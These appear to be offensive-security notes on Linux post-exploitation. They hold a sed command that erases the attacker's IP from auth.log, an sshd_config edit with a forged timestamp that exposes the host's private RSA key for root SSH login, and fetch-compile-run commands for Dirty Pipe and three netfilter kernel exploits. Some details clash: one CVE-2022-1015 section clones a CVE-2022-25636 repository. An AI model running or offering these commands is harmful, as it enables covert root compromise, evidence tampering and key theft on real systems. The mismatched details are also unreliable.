if stealth is needed only edit files in `/dev/shm` as this is in memory and no logs will be created
### Removing our IP from access logs:
`sed -i "/<ip>/d" /var/log/auth.log`

### Add SSH key without editing timestamp
**Requires root**
1. Copies timestamp of `sshd-config` to `/dev/shm/.f`
2. Adds the root ssh key to the Auth Keys file. 
3. Restarts ssh daemon
4. Reverts the timestamp
5. Removes `/dev/shm/.f`
6. Cats the root ssh key to copy 

Copy the timestamp of the ssh_configs timestamp 
```shell
touch -r /etc/ssh/sshd_config /dev/shm/.f; sed -i '/^#AuthorizedKeysFile/ s/^#//' /etc/ssh/sshd_config && sed -i '/^AuthorizedKeysFile/ s/$/ \/etc\/ssh\/sshd_config/' /etc/ssh/sshd_config; systemctl reload sshd; touch -r /dev/shm/.f /etc/ssh/sshd_config; rm /dev/shm/.f; cat /etc/ssh/ssh_host_rsa_key
```
Copy the ssh key to local machine
```shell
chmod 600 <file>
```
```shell
ssh -i key root@<IP>
```

## Dirty Pipe
**CVE-2022-0847**
* Affects kernel versions 5.8 - 5.17
* Android phones are affected
```shell
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```
Exploit 1 modifies the `/etc/passwd` and allows root privileges
Exploit 2 can execute SUID binaries with root privilges. 
```shell
./exploit-2 /usr/bin/sudo
```
## Netfilter
* Linux kernel module that provides, packet filtering, network address translation, and more. 

Has 3 main functions
1. Packet defragmentation
2. Connection Tracking
3. NAT
* When activated, all IP packets are checked by `netfilter`
### CVEs
1. [CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)
2. [CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)
3. [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)

#### CVE-2021-22555
Kernel Version 2.6-5.11
```shell
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```
#### CVE-2022-1015
Kernel Version 5.4-5.6.10
```shell
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```
#### CVE-2023-32233
Kernel version up to 6.3.1
```shell
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```